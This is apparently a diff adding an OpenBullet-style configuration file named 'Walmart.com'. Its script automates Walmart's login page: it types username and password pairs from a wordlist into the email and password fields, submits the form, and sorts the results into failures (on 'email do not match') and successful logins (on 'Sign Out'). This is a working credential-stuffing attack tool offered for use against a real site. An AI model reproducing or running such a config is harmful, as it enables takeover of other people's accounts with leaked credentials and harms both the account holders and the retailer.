@@ -1,0 +1,49 @@
+[SETTINGS]
+{
+  "Name": "Walmart.com",
+  "SuggestedBots": 1,
+  "LastModified": "2018-12-14T02:54:30.8700216+01:00",
+  "AdditionalInfo": "",
+  "Author": "FreakShock",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+BROWSERACTION Open "" 
+IF "<ADDRESS>" EqualTo "https://www.walmart.com/account/login?tid=0&returnUrl=%2F"
+JUMP #CLEAR_USER
+ENDIF
+
+NAVIGATE "https://www.walmart.com/account/login?tid=0&returnUrl=%2F" 60 
+#CLEAR_USER ELEMENTACTION XPath "//*[@id=\"email\"]" 
+  Clear "" -> VAR "" 
+#CLEAR_PASS ELEMENTACTION XPath "//*[@id=\"password\"]" 
+  Clear "" -> VAR "" 
+#USER ELEMENTACTION XPath "//*[@id=\"email\"]" 
+  SendKeys "<USER>" -> VAR "" 
+#PASS ELEMENTACTION XPath "//*[@id=\"password\"]" 
+  SendKeys "<PASS>" -> VAR "" 
+#SUBMIT ELEMENTACTION XPath "//*[@id=\"sign-in-form\"]/button[1]" 
+  Click "" -> VAR "" 
+#FAIL KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "email do not match" 
+#SUCCESS KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "Sign Out" 
+#CLEAR_COOKIES BROWSERACTION ClearCookies "" 
+#QUIT BROWSERACTION Quit "" 
